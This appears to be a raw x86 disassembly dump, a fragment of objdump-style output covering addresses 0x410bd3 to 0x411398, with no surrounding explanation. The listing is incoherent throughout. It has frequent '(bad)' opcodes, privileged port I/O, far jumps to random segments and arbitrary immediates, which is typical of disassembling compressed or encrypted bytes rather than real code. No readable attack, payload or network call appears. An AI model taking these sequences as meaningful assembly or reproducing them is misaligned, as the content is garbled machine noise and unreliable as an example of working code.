  410bd3:	or     DWORD PTR [edi+0x38849f99],esi
  410bd9:	pop    edi
  410bda:	add    DWORD PTR [eax-0x61],edi
  410bdd:	and    dl,BYTE PTR [ecx+0x2b08902e]
  410be3:	push   ebx
  410be4:	adc    bh,ah
  410be6:	cs (bad) 
  410be8:	inc    ebx
  410be9:	jp     0x410baa
  410beb:	push   ecx
  410bec:	mov    dl,dh
  410bee:	jp     0x410bd8
  410bf0:	jg     0x410b91
  410bf2:	fisttp DWORD PTR [ecx]
  410bf4:	xchg   esi,eax
  410bf5:	das    
  410bf6:	int3   
  410bf7:	sbb    BYTE PTR [ebp*1+0x710427dd],ch
  410bfe:	pop    esi
  410c00:	jp     0x410bbc
  410c02:	rol    DWORD PTR [edi],1
  410c04:	into   
  410c05:	pop    ecx
  410c06:	dec    edx
  410c07:	and    edi,edx
  410c09:	cmp    bl,BYTE PTR [eax+0x5a11f8be]
  410c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c10:	jp     0x410c47
  410c12:	lods   al,BYTE PTR ds:[esi]
  410c13:	cwde   
  410c14:	out    dx,al
  410c15:	int3   
  410c16:	push   ebp
  410c17:	xor    esp,DWORD PTR [edx+edi*1]
  410c1a:	stos   BYTE PTR es:[edi],al
  410c1b:	jmp    0x6d1a5d50
  410c20:	loop   0x410c33
  410c22:	push   ebx
  410c23:	fbstp  TBYTE PTR [esi-0x1253832a]
  410c29:	mov    edx,0x289a9bd8
  410c2e:	(bad)  
  410c2f:	fstp   QWORD PTR [eax-0x19a35b16]
  410c35:	mov    WORD PTR [edi+0x1858d7a3],?
  410c3b:	frstor [edi-0x37]
  410c3e:	out    0x87,al
  410c40:	adc    al,bh
  410c42:	sahf   
  410c43:	rol    BYTE PTR [edi],1
  410c45:	(bad)
  410c48:	sub    dl,BYTE PTR [eax-0x6c]
  410c4b:	imul   ecx,ebp,0xd1d115ca
  410c51:	pop    ds
  410c52:	mov    esi,0x4ff1f558
  410c57:	fmul   DWORD PTR [esi]
  410c59:	adc    al,0x85
  410c5b:	or     bh,bh
  410c5d:	xchg   cl,ch
  410c5f:	(bad)  
  410c60:	stos   DWORD PTR es:[edi],eax
  410c61:	cmp    al,0x57
  410c63:	pop    es
  410c64:	pop    esp
  410c65:	(bad)  
  410c66:	sub    edi,ebx
  410c68:	cmp    ebx,edi
  410c6a:	iret   
  410c6b:	sbb    edx,DWORD PTR [esi-0x285a29d1]
  410c71:	and    BYTE PTR [edx],0xa5
  410c74:	pop    eax
  410c75:	pop    ss
  410c76:	mov    esi,ecx
  410c78:	call   0x6e155ea0
  410c7d:	inc    eax
  410c7e:	pop    ebx
  410c7f:	jp     0x410c01
  410c81:	lods   eax,DWORD PTR ds:[esi]
  410c82:	inc    ebx
  410c83:	daa    
  410c84:	imul   ecx,esi,0x6f
  410c87:	add    DWORD PTR [edi-0x5e66a82f],eax
  410c8d:	scas   eax,DWORD PTR es:[edi]
  410c8e:	lods   al,BYTE PTR ds:[esi]
  410c8f:	inc    ebp
  410c90:	lods   al,BYTE PTR gs:[esi]
  410c92:	in     eax,0x57
  410c94:	jns    0x410c8f
  410c96:	and    BYTE PTR [eax],dh
  410c98:	scas   eax,DWORD PTR es:[edi]
  410c99:	mov    ds:0x7df116bf,eax
  410c9e:	call   0x5bbab0a4
  410ca3:	loope  0x410cf6
  410ca5:	jmp    0x1227413e
  410caa:	inc    edx
  410cab:	cmp    ch,cl
  410cad:	ror    eax,1
  410caf:	inc    eax
  410cb0:	mov    cs,WORD PTR [esi-0x8]
  410cb3:	or     BYTE PTR [eax],0xa9
  410cb6:	adc    eax,0x2b20bf55
  410cbb:	shr    cl,cl
  410cbd:	mov    edx,0x787acbaa
  410cc2:	jno    0x410d03
  410cc4:	inc    edx
  410cc5:	push   ecx
  410cc6:	(bad)  
  410cc8:	push   eax
  410cc9:	sbb    ecx,DWORD PTR [esi+0x1f623942]
  410ccf:	push   0x7baf4c03
  410cd4:	pop    ebx
  410cd5:	fisttp QWORD PTR [edx]
  410cd7:	and    eax,0xb669d61d
  410cdc:	rcl    ebp,1
  410cde:	or     al,0xa7
  410ce0:	jl     0x410d2d
  410ce2:	lock inc esp
  410ce4:	add    DWORD PTR [ebp-0x13701c10],edx
  410cea:	mov    cl,0x7f
  410cec:	dec    ebp
  410ced:	fmul   QWORD PTR [esp+ebp*2]
  410cf0:	bound  edx,QWORD PTR [ecx]
  410cf2:	(bad)  
  410cf3:	mov    cl,0x5c
  410cf5:	lock idiv DWORD PTR ss:[esi-0x54b32a9]
  410cfd:	inc    edx
  410cfe:	sub    DWORD PTR [eax+0x44b80d6d],0x81367030
  410d08:	adc    BYTE PTR [eiz*4+0x14113c43],ah
  410d0f:	jecxz  0x410d5b
  410d11:	sub    ecx,DWORD PTR [ebx+eax*8+0x48]
  410d15:	out    dx,al
  410d16:	mov    al,ds:0x791f15cc
  410d1b:	popf   
  410d1c:	enter  0x4a6a,0xdb
  410d20:	xor    ecx,DWORD PTR [ebx]
  410d22:	aad    0xe7
  410d24:	mov    ch,0x43
  410d26:	retf   0xd178
  410d29:	mov    ecx,0x523cc61d
  410d2e:	paddusw mm5,QWORD PTR [edx]
  410d31:	mov    ds:0xf3967cd2,eax
  410d36:	(bad)  
  410d37:	(bad)
  410d3a:	sbb    esi,DWORD PTR [ecx+0x29]
  410d3d:	enter  0xa481,0xba
  410d41:	and    DWORD PTR [esp+ecx*2],ebp
  410d44:	and    al,0xcf
  410d46:	mov    bh,0x80
  410d48:	jae    0x410d35
  410d4a:	sbb    BYTE PTR [edx+edi*1-0x79],ah
  410d4e:	leave  
  410d4f:	and    bh,bl
  410d51:	sbb    al,0x4d
  410d53:	clc    
  410d54:	mov    ds:0x4528a345,eax
  410d59:	mov    ebp,0x9940dac0
  410d5e:	pop    eax
  410d5f:	dec    ebx
  410d60:	and    eax,DWORD PTR [ecx+0x1a]
  410d63:	lods   eax,DWORD PTR ds:[esi]
  410d64:	jmp    0x80c87334
  410d69:	stc    
  410d6a:	jle    0x410cec
  410d6c:	jl     0x410d64
  410d6e:	inc    esi
  410d6f:	sti    
  410d70:	shl    BYTE PTR [eax-0xd],cl
  410d73:	mov    dh,0xd3
  410d75:	lea    esp,[ecx+0x58]
  410d78:	test   eax,0xf006f82c
  410d7d:	sar    ebp,0x6c
  410d80:	into   
  410d81:	stos   DWORD PTR es:[edi],eax
  410d82:	mov    edx,0x29654887
  410d87:	shr    DWORD PTR [ecx+0x33],0x83
  410d8b:	dec    ebp
  410d8c:	push   eax
  410d8d:	and    ch,al
  410d8f:	push   0x3
  410d91:	and    bl,al
  410d93:	mov    ds:0x216ab2f8,al
  410d98:	xor    BYTE PTR [esi+0x57],0xf
  410d9c:	loopne 0x410db8
  410d9e:	inc    eax
  410d9f:	xchg   esi,eax
  410da0:	and    al,ch
  410da2:	clc    
  410da3:	or     eax,ebx
  410da5:	out    0x89,al
  410da7:	cmp    eax,0xf63e4e6d
  410dac:	jmp    0x68ec73d0
  410db1:	lods   al,BYTE PTR cs:[esi]
  410db3:	pop    es
  410db4:	cmp    BYTE PTR [ecx-0x54],ch
  410db7:	mov    esi,0x90ef9b7e
  410dbc:	lods   al,BYTE PTR ds:[esi]
  410dbd:	sub    eax,0x81837f59
  410dc2:	cli    
  410dc3:	push   edi
  410dc4:	adc    BYTE PTR [ebx+0x38184d3c],ah
  410dca:	not    edi
  410dcc:	pop    esp
  410dcd:	mov    ?,esi
  410dcf:	push   ds
  410dd0:	xlat   BYTE PTR ds:[ebx]
  410dd1:	and    cl,BYTE PTR [edx-0x7444f165]
  410dd7:	div    DWORD PTR [edx]
  410dd9:	pop    ecx
  410dda:	xor    BYTE PTR ds:0x93eee01c,ah
  410de0:	sahf   
  410de1:	xchg   esi,eax
  410de2:	in     eax,dx
  410de3:	test   eax,0x7d286e99
  410de8:	inc    eax
  410de9:	mov    bl,0x98
  410deb:	xor    al,0x6
  410ded:	push   cs
  410dee:	mov    al,0x19
  410df0:	mov    cl,0x9f
  410df2:	push   esp
  410df3:	icebp  
  410df4:	adc    ch,BYTE PTR [edi+0xc17752f]
  410dfa:	ret    0xcc3f
  410dfd:	mov    ah,0x97
  410dff:	xchg   esp,eax
  410e00:	push   esi
  410e01:	into   
  410e02:	outs   dx,DWORD PTR ds:[esi]
  410e03:	and    bh,BYTE PTR [eax-0x41b8132a]
  410e09:	mov    ch,bl
  410e0b:	jmp    0x8bd1:0x7083c06e
  410e12:	rcl    BYTE PTR [ebx-0x4e72ddb8],0x38
  410e19:	cmp    cl,BYTE PTR [edx+0x5f]
  410e1c:	ret    0x9a2
  410e1f:	jg     0x410e98
  410e21:	inc    ebx
  410e22:	mul    BYTE PTR [esi]
  410e24:	das    
  410e25:	cmp    DWORD PTR [ebp+0x29],edi
  410e28:	push   esi
  410e29:	inc    ebx
  410e2a:	mov    WORD PTR [ebp+0x7ff1b9f8],gs
  410e30:	stos   BYTE PTR es:[edi],al
  410e31:	repnz call 0x1a4d:0x1b0fc7e6
  410e39:	cmp    al,0x2f
  410e3b:	dec    ebx
  410e3c:	push   eax
  410e3d:	fs add al,0xe9
  410e40:	jne    0x410e2e
  410e42:	inc    edi
  410e43:	mov    dl,0x37
  410e45:	scas   al,BYTE PTR es:[edi]
  410e46:	or     al,0x9f
  410e48:	sub    eax,0xbfe11c4e
  410e4d:	add    eax,0xfa6ea4ab
  410e52:	xlat   BYTE PTR ds:[ebx]
  410e53:	pop    edi
  410e54:	clc    
  410e55:	mov    dl,0x1
  410e57:	mov    cl,0x5c
  410e59:	mov    esp,0xa09bdba
  410e5e:	add    eax,0xf5772429
  410e63:	mov    ds:0x8bb74a6b,al
  410e68:	nop
  410e69:	and    BYTE PTR [edi],dl
  410e6b:	or     al,0x97
  410e6d:	mov    ds:0x9c878a13,eax
  410e72:	sti    
  410e73:	mov    esp,0x8139ce3c
  410e78:	push   0xffffffcc
  410e7a:	mov    dl,0xf6
  410e7c:	retf   
  410e7d:	fadd   DWORD PTR [ecx]
  410e7f:	leave  
  410e80:	add    DWORD PTR [edx],0xffffffdc
  410e83:	jbe    0x410f02
  410e85:	pop    ds
  410e86:	inc    DWORD PTR [esi+0x2903f4d1]
  410e8c:	popf   
  410e8d:	ja     0x410eee
  410e8f:	sbb    DWORD PTR [ebx],0x7d
  410e92:	jle    0x410eb2
  410e94:	fist   WORD PTR [ebx-0x74b5a30d]
  410e9a:	inc    ebx
  410e9b:	cmp    DWORD PTR [ebp-0x275d6431],ebx
  410ea1:	jae    0x410e5b
  410ea3:	push   cs
  410ea4:	idiv   DWORD PTR [ecx]
  410ea6:	mov    dl,0xe1
  410ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ea9:	jae    0x410eb3
  410eab:	mov    bl,0x99
  410ead:	xor    dh,bl
  410eaf:	push   esi
  410eb0:	lea    edi,[ebx-0x1538f5cf]
  410eb6:	adc    esi,edi
  410eb8:	lahf   
  410eb9:	and    eax,0x1fa0cfa1
  410ebe:	inc    eax
  410ebf:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ec1:	ss mov ecx,0x74ddfb13
  410ec7:	and    eax,0xcbe219d7
  410ecc:	xchg   ebp,eax
  410ecd:	in     al,0x3b
  410ecf:	ja     0x410f24
  410ed1:	inc    ebx
  410ed2:	push   eax
  410ed3:	dec    edi
  410ed4:	mov    eax,DWORD PTR [ebx]
  410ed6:	or     al,0xf5
  410ed8:	mov    edi,0xc422f07
  410edd:	das    
  410ede:	mov    ecx,0xe58544dd
  410ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ee4:	aas    
  410ee5:	inc    ecx
  410ee6:	push   eax
  410ee7:	sub    DWORD PTR [edi-0x80],edi
  410eea:	(bad)  
  410eeb:	std    
  410eec:	sti    
  410eed:	ja     0x410f3e
  410eef:	loop   0x410ebb
  410ef1:	scas   eax,DWORD PTR es:[edi]
  410ef2:	mov    eax,0xc3c38afa
  410ef7:	add    ch,BYTE PTR [edx-0x14]
  410efa:	cdq    
  410efb:	pop    eax
  410efc:	shr    DWORD PTR [edi-0x76],cl
  410eff:	add    dl,BYTE PTR [esi-0x14]
  410f02:	loope  0x410f0f
  410f04:	inc    esi
  410f05:	lods   eax,DWORD PTR ds:[esi]
  410f06:	mov    esi,0x2fbd234f
  410f0b:	sub    eax,eax
  410f0d:	xchg   ebp,eax
  410f0e:	stos   DWORD PTR es:[edi],eax
  410f0f:	aad    0xd3
  410f11:	fistp  DWORD PTR [edx+0x3a]
  410f14:	add    DWORD PTR [eax+ebx*2],0xd11969af
  410f1b:	addr16 call 0xf00c:0x669f8318
  410f23:	ss pop ebx
  410f25:	stc    
  410f26:	mov    esi,0x26860f58
  410f2b:	fdivr  QWORD PTR [ebx+0x210021e3]
  410f31:	and    DWORD PTR [ebp+0x482a339d],edi
  410f37:	push   0x6ea8d2a1
  410f3c:	or     al,0x1d
  410f3e:	xchg   edx,eax
  410f3f:	push   es
  410f40:	arpl   WORD PTR [ebx-0x3d778520],si
  410f46:	test   DWORD PTR [eax+eiz*1+0x27],ecx
  410f4a:	pushf  
  410f4b:	in     eax,dx
  410f4c:	cmp    al,0x31
  410f4e:	jbe    0x410ed9
  410f50:	scas   eax,DWORD PTR es:[edi]
  410f51:	mov    dh,0x19
  410f53:	pop    edx
  410f54:	push   cs
  410f55:	std    
  410f56:	les    ebx,FWORD PTR [ecx]
  410f58:	int3   
  410f59:	push   es
  410f5a:	inc    edi
  410f5b:	leave  
  410f5c:	or     edi,esp
  410f5e:	mov    cl,BYTE PTR [ebp+0x65]
  410f61:	xchg   esi,eax
  410f62:	or     eax,0x7bdcfa9b
  410f67:	xchg   ebx,eax
  410f68:	sub    al,0x25
  410f6a:	out    0x41,al
  410f6c:	inc    ecx
  410f6d:	std    
  410f6e:	hlt    
  410f6f:	scas   al,BYTE PTR es:[edi]
  410f70:	scas   eax,DWORD PTR es:[edi]
  410f71:	or     al,0x50
  410f73:	popf   
  410f74:	out    dx,eax
  410f75:	pop    ebp
  410f76:	xchg   ecx,eax
  410f77:	lods   eax,DWORD PTR ds:[esi]
  410f78:	or     BYTE PTR [eax+ebx*8-0x540fd829],al
  410f7f:	or     al,0xa1
  410f81:	ret    
  410f82:	xchg   edx,eax
  410f83:	in     eax,0xde
  410f85:	cli    
  410f86:	aaa    
  410f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f88:	in     eax,0xc8
  410f8a:	cmp    ah,BYTE PTR [ebp-0x2b8d7bd]
  410f90:	mov    BYTE PTR [esi],bh
  410f92:	cmp    dh,BYTE PTR [eax]
  410f94:	aaa    
  410f95:	mov    bh,0x66
  410f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f98:	jae    0x410f5a
  410f9a:	dec    edi
  410f9b:	popa   
  410f9c:	aad    0xee
  410f9e:	(bad)  
  410f9f:	dec    esp
  410fa0:	arpl   WORD PTR [eax-0x27ad0204],si
  410fa6:	shl    DWORD PTR [esi],cl
  410fa8:	in     al,dx
  410fa9:	mov    dl,0x69
  410fab:	ret    
  410fac:	add    eax,0xde42eead
  410fb1:	data16 adc BYTE PTR [ebx+0x1d],bh
  410fb5:	sbb    al,0x3f
  410fb7:	cmp    bl,BYTE PTR [ebx-0x2d]
  410fba:	push   edx
  410fbb:	les    eax,FWORD PTR [ebp-0x4027c016]
  410fc1:	dec    ebp
  410fc2:	and    ebx,ecx
  410fc4:	addr16 sahf 
  410fc6:	out    0x94,eax
  410fc8:	leave  
  410fc9:	mov    bl,0x6b
  410fcb:	jne    0x411025
  410fcd:	out    dx,al
  410fce:	(bad)  
  410fd0:	jecxz  0x411004
  410fd2:	or     al,0xe0
  410fd4:	cs pushf 
  410fd6:	and    DWORD PTR [edx],0xffffffde
  410fd9:	mov    al,ds:0xc64731bc
  410fde:	add    DWORD PTR [edx+esi*2],esp
  410fe1:	push   eax
  410fe2:	pop    edi
  410fe3:	inc    ebp
  410fe4:	loop   0x411065
  410fe6:	adc    BYTE PTR [eax],0x0
  410fe9:	inc    ecx
  410fea:	xlat   BYTE PTR ds:[ebx]
  410feb:	lock mov ch,0x2a
  410fee:	outs   dx,BYTE PTR ds:[esi]
  410fef:	mov    DWORD PTR [ebp+0x71],0xff14312a
  410ff6:	push   ss
  410ff7:	stos   DWORD PTR es:[edi],eax
  410ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ff9:	pop    esp
  410ffa:	gs dec ebx
  410ffc:	sbb    al,0x72
  410ffe:	dec    ecx
  410fff:	xchg   ebx,eax
  411000:	or     al,0xa1
  411002:	jne    0x41107e
  411004:	lods   eax,DWORD PTR ds:[esi]
  411005:	aas    
  411006:	fwait
  411007:	cmc    
  411008:	sub    al,0x21
  41100a:	ss loope 0x410fa5
  41100d:	mov    bh,0x88
  41100f:	adc    ah,BYTE PTR [eax]
  411011:	inc    edx
  411012:	inc    ebx
  411013:	pop    ecx
  411014:	call   0xe85ea7ba
  411019:	out    0x22,eax
  41101b:	jmp    0xe7d5:0xabf8c6f2
  411022:	popa   
  411023:	clc    
  411024:	out    0xc7,eax
  411026:	jbe    0x411065
  411028:	jbe    0x411000
  41102a:	xchg   ebp,edx
  41102c:	mov    esp,0x3fd871c8
  411031:	cmc    
  411032:	push   es
  411033:	data16 icebp 
  411035:	xchg   edx,eax
  411036:	and    edi,edx
  411038:	fdivr  DWORD PTR [edi+edx*4]
  41103b:	mov    gs,WORD PTR [ecx-0x78efabd8]
  411041:	out    dx,al
  411042:	push   edx
  411043:	inc    eax
  411044:	retf   0x55
  411047:	fsubr  st,st(0)
  411049:	loopne 0x411037
  41104b:	mov    al,ds:0xa9cfafe4
  411050:	adc    eax,0xfc732e35
  411055:	int3   
  411056:	es nop
  411058:	xchg   ecx,eax
  411059:	jae    0x4110c3
  41105b:	out    0x27,al
  41105d:	adc    edi,DWORD PTR [esi+eax*2+0x30ec962e]
  411064:	xchg   ebx,eax
  411065:	lods   eax,DWORD PTR ds:[esi]
  411066:	cmp    eax,0x5642de8f
  41106b:	popf   
  41106c:	mov    al,ds:0x4c0913ef
  411071:	rcl    BYTE PTR [edx+0x64],cl
  411074:	sub    cl,BYTE PTR [ebp+0x7]
  411077:	mov    BYTE PTR [ebp+0x7a],ch
  41107a:	rol    DWORD PTR [ebp-0x3c],1
  41107d:	test   DWORD PTR ds:0xbe4c69a9,ebp
  411083:	add    DWORD PTR [esi-0x669e95d8],edi
  411089:	push   edi
  41108a:	mov    ah,0x64
  41108c:	jbe    0x41101f
  41108e:	sbb    al,0x22
  411090:	in     eax,dx
  411091:	mov    cs,WORD PTR [edx-0x71]
  411094:	pop    eax
  411095:	mov    bh,BYTE PTR [edx-0x2d67ed1a]
  41109b:	cs mov dh,ch
  41109e:	adc    eax,0x101d9a3d
  4110a3:	fdiv   DWORD PTR [ebx-0x280e481b]
  4110a9:	shl    DWORD PTR [ebx-0x1e],0x22
  4110ad:	(bad)  
  4110ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110af:	lock and DWORD PTR [esi+0x47],0xffffff86
  4110b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110b5:	add    ch,BYTE PTR [ebx+0x3f]
  4110b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110b9:	jbe    0x411064
  4110bb:	mov    BYTE PTR [edi+ebx*8],0x34
  4110bf:	fld    QWORD PTR [esi]
  4110c1:	mov    al,0x87
  4110c3:	(bad)  
  4110c4:	jmp    0x4110c4
  4110c6:	leave  
  4110c7:	iret   
  4110c8:	xor    ch,BYTE PTR [ebp-0x14]
  4110cb:	add    al,0x4e
  4110cd:	(bad)  
  4110ce:	mov    bl,0x62
  4110d0:	out    0x5e,eax
  4110d2:	and    eax,0xaec25a86
  4110d7:	popf   
  4110d8:	inc    edx
  4110d9:	pop    edx
  4110da:	add    bh,BYTE PTR [edx]
  4110dc:	pop    ebp
  4110dd:	ret    
  4110de:	jae    0x4110d0
  4110e0:	inc    edi
  4110e1:	sbb    BYTE PTR [ecx],dl
  4110e3:	out    dx,eax
  4110e4:	fs into 
  4110e6:	les    ebp,FWORD PTR [edx*1-0x75ac839d]
  4110ed:	fwait
  4110ee:	inc    ebp
  4110ef:	jns    0x411118
  4110f1:	ror    bh,1
  4110f3:	dec    esp
  4110f4:	fwait
  4110f5:	jp     0x411174
  4110f7:	aaa    
  4110f8:	and    DWORD PTR ds:0x6becbf07,esp
  4110fe:	xchg   esp,eax
  4110ff:	js     0x4110fb
  411101:	repnz and ebp,0xbbce69c5
  411108:	enter  0xd5b9,0xd7
  41110c:	mov    ebp,ebx
  41110e:	sub    DWORD PTR [edi+0x7e],ecx
  411111:	and    edi,ebx
  411113:	out    0x8f,eax
  411115:	push   cs
  411116:	xchg   edx,eax
  411117:	sub    al,0x26
  411119:	jecxz  0x4110b1
  41111b:	mov    edx,0x59068e82
  411120:	test   BYTE PTR [esi],bl
  411122:	daa    
  411123:	sbb    DWORD PTR [edi+esi*4],0xcd0b5f0d
  41112a:	xchg   esp,eax
  41112b:	mov    eax,0x234b643c
  411130:	test   DWORD PTR [ecx],0x449f2074
  411136:	dec    ebp
  411137:	ret    0x648a
  41113a:	dec    esi
  41113b:	and    eax,0xefd94db
  411140:	js     0x411118
  411142:	jae    0x4110ec
  411144:	adc    BYTE PTR [ebp+0x76e41f79],al
  41114a:	test   ax,0x3cef
  41114e:	pushf  
  41114f:	loop   0x4111ca
  411151:	inc    ecx
  411152:	cmp    edi,ebp
  411154:	popa   
  411155:	dec    BYTE PTR [ecx+0x79]
  411158:	arpl   WORD PTR [edi],bx
  41115a:	iret   
  41115b:	xchg   ebx,eax
  41115c:	rcr    BYTE PTR [esi+ebp*1-0x3d93d180],cl
  411163:	out    0x60,al
  411165:	dec    ebx
  411166:	iret   
  411167:	mov    DWORD PTR [ebx-0x67],esp
  41116a:	ds push ds
  41116c:	daa    
  41116d:	mov    eax,0x79e7dd04
  411172:	aas    
  411173:	pushf  
  411174:	leave  
  411175:	rcr    dl,1
  411177:	hlt    
  411178:	int    0xe4
  41117a:	mov    BYTE PTR [edx-0x3f1e8400],0xb7
  411181:	pop    esp
  411182:	test   DWORD PTR [esi],esp
  411184:	fmul   QWORD PTR [eax]
  411186:	adc    eax,0x72301133
  41118b:	in     eax,dx
  41118c:	mov    ah,0x8c
  41118e:	cld    
  41118f:	add    edx,DWORD PTR cs:[ecx+0x6a87f04a]
  411196:	or     BYTE PTR [eax-0x20],ch
  411199:	dec    ecx
  41119a:	dec    edi
  41119b:	add    BYTE PTR [edx],bl
  41119d:	or     esi,DWORD PTR [ebp-0x10d86983]
  4111a3:	fsubrp st(1),st
  4111a5:	std    
  4111a6:	hlt    
  4111a7:	mov    WORD PTR [esi+ebp*1+0x3c682163],es
  4111ae:	xor    DWORD PTR [esi],ebp
  4111b0:	mov    bh,0x54
  4111b2:	mov    cl,0x80
  4111b4:	nop
  4111b5:	loopne 0x411202
  4111b7:	inc    edi
  4111b8:	sub    DWORD PTR [edx+0x54],0x47
  4111bc:	addr16 xchg edi,eax
  4111be:	cmc    
  4111bf:	push   0x3d
  4111c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111c2:	sub    cl,cl
  4111c4:	pop    es
  4111c5:	pop    eax
  4111c6:	cmp    BYTE PTR [ecx],cl
  4111c8:	jmp    0x4111c3
  4111ca:	jp     0x411222
  4111cc:	mov    bh,dh
  4111ce:	inc    ebx
  4111cf:	fstp   TBYTE PTR [ebp+0xa]
  4111d2:	xchg   BYTE PTR [eax],cl
  4111d4:	out    dx,eax
  4111d5:	pop    esp
  4111d6:	xor    DWORD PTR [esi+0x1df0241a],0xc2604bf1
  4111e0:	xchg   BYTE PTR ds:[edi+0x162525e],ah
  4111e7:	or     esp,DWORD PTR [edi+0x29]
  4111ea:	test   DWORD PTR [eax+0x5057f6ec],ebp
  4111f0:	je     0x4111b7
  4111f2:	mov    edi,0x6e519afa
  4111f7:	xchg   BYTE PTR [ecx+0x5e],bl
  4111fa:	pop    ebx
  4111fb:	jne    0x411239
  4111fd:	sbb    eax,0x98412999
  411202:	and    dh,al
  411204:	add    DWORD PTR [eax+0x24],edx
  411207:	pop    edx
  411208:	jecxz  0x411273
  41120a:	jmp    0x4111db
  41120c:	sar    DWORD PTR [ebx+ebp*8+0x7d],0x27
  411211:	fiadd  WORD PTR [esi]
  411213:	xor    al,0xcc
  411215:	pop    edx
  411216:	mov    eax,ecx
  411218:	(bad)  
  411219:	lods   eax,DWORD PTR ds:[esi]
  41121a:	jne    0x4111f4
  41121c:	push   si
  41121e:	neg    BYTE PTR [edx+0x38]
  411221:	ins    DWORD PTR es:[edi],dx
  411222:	in     eax,dx
  411223:	add    eax,0x26adedec
  411228:	push   esp
  411229:	jmp    0x411236
  41122b:	ret    0x42a6
  41122e:	xlat   BYTE PTR ds:[ebx]
  41122f:	mov    ecx,0x6fef732b
  411234:	cmp    al,0x18
  411236:	scas   eax,DWORD PTR es:[edi]
  411237:	xor    ah,BYTE PTR [edx-0x3c]
  41123a:	jmp    0x4112aa
  41123c:	sbb    ebp,0x72bd773a
  411242:	popf   
  411243:	jmp    0x4b5f070d
  411248:	div    DWORD PTR [eax+0x2b]
  41124b:	shl    DWORD PTR [esi-0x7a76adc0],cl
  411251:	mov    ebx,0xe1959824
  411256:	xor    ah,BYTE PTR [esi+eax*2]
  411259:	out    dx,al
  41125a:	inc    ebx
  41125b:	sbb    al,BYTE PTR [eax-0x4fd04a98]
  411261:	pop    edx
  411262:	in     eax,dx
  411263:	aam    0xaa
  411265:	add    esi,DWORD PTR [edi+edx*1-0x6a]
  411269:	out    dx,eax
  41126a:	mov    ebp,0xb9d4f119
  41126f:	and    DWORD PTR [ecx-0x7f],edi
  411272:	in     eax,0x74
  411274:	dec    esi
  411275:	lds    ecx,FWORD PTR [ebx+0x44bbd525]
  41127b:	lods   al,BYTE PTR ds:[esi]
  41127c:	mov    eax,0x69bc5122
  411281:	jmp    0x80c1a0ff
  411286:	pop    ds
  411287:	add    al,0xef
  411289:	aad    0x69
  41128b:	adc    DWORD PTR [edi+ebx*1+0x70154021],ebp
  411292:	xlat   BYTE PTR ds:[ebx]
  411293:	lock xor dl,BYTE PTR [ecx+0x2b7f30c2]
  41129a:	test   al,0xfd
  41129c:	and    eax,DWORD PTR [eax]
  41129e:	jb     0x41127e
  4112a0:	or     esp,DWORD PTR [ecx+eiz*2+0x13]
  4112a4:	ja     0x411226
  4112a6:	xchg   DWORD PTR [eax-0x164164c6],ebx
  4112ac:	cmp    eax,0x50b1c2f6
  4112b1:	jnp    0x41131f
  4112b3:	dec    ebp
  4112b4:	jnp    0x4112af
  4112b6:	mov    al,ds:0x2d2e2900
  4112bb:	add    eax,0xc8edaebf
  4112c0:	sahf   
  4112c1:	pop    edi
  4112c2:	stos   DWORD PTR es:[edi],eax
  4112c3:	fndisi(8087 only) 
  4112c5:	test   eax,0x8fc73498
  4112ca:	neg    BYTE PTR ds:0x443cb0a7
  4112d0:	dec    eax
  4112d1:	imul   esi,DWORD PTR [eax+0x7c],0xffffff96
  4112d5:	mov    ?,WORD PTR [edx+0x5f]
  4112d8:	jle    0x4112c7
  4112da:	inc    eax
  4112db:	pop    ebx
  4112dc:	jns    0x411353
  4112de:	ja     0x41131d
  4112e0:	cmp    dl,bl
  4112e2:	pop    ss
  4112e3:	or     eax,0x46f420eb
  4112e8:	pop    edx
  4112e9:	pop    ecx
  4112ea:	mov    ds:0x835add8,al
  4112ef:	mov    al,0x97
  4112f1:	mov    bh,0x47
  4112f3:	loopne 0x41127e
  4112f5:	je     0x411368
  4112f7:	push   esi
  4112f8:	sbb    DWORD PTR [ebx+ebx*4+0x764a3c42],esi
  4112ff:	(bad)  
  411300:	loop   0x41134a
  411302:	test   eax,0x8ec9734e
  411307:	jmp    0xfa55131b
  41130c:	test   edx,ebx
  41130e:	retf   0x6de3
  411311:	xor    DWORD PTR [ebx+0x590bca8],edx
  411317:	mov    ah,0x41
  411319:	out    dx,eax
  41131a:	dec    esi
  41131b:	add    dl,dh
  41131d:	cmp    BYTE PTR [esi-0x744fdf81],cl
  411323:	push   es
  411324:	cmp    eax,0x23e1c487
  411329:	push   cs
  41132a:	xor    al,ch
  41132c:	pop    eax
  41132d:	adc    DWORD PTR [esi-0x2ec17eff],ebx
  411333:	daa    
  411334:	dec    ebp
  411335:	mov    eax,0x380b78e7
  41133a:	ins    BYTE PTR es:[edi],dx
  41133b:	xor    eax,0xa526982
  411340:	test   al,0x67
  411342:	(bad)  
  411344:	loop   0x41131c
  411346:	rol    DWORD PTR [edi+0x55],0x60
  41134a:	mov    ah,0x3c
  41134c:	pop    ss
  41134d:	sub    al,0x35
  41134f:	rcr    esi,0x57
  411352:	sar    eax,cl
  411354:	gs pop ebx
  411356:	adc    DWORD PTR [esi],edi
  411358:	ret    
  411359:	mov    cl,0x47
  41135b:	xchg   esi,eax
  41135c:	and    DWORD PTR [ecx+0x6ba904a4],ebp
  411362:	xor    bl,BYTE PTR [eax+0x55485a59]
  411368:	std    
  411369:	lar    eax,WORD PTR [esp+ebp*4+0x721b0398]
  411371:	xchg   edi,eax
  411372:	mov    di,0x6a5b
  411376:	mov    bl,0x7a
  411378:	fild   DWORD PTR [ecx+0x3e]
  41137b:	xlat   BYTE PTR ds:[ebx]
  41137c:	cmp    bl,0x12
  41137f:	jae    0x41135c
  411381:	popf   
  411382:	mov    ebp,0xce88e210
  411387:	mov    dl,0xf3
  411389:	call   0x65b25a9e
  41138e:	ror    BYTE PTR ds:0x5a842a27,1
  411394:	jge    0x4113b1
  411396:	or     edx,esp
  411398:	dec    esp
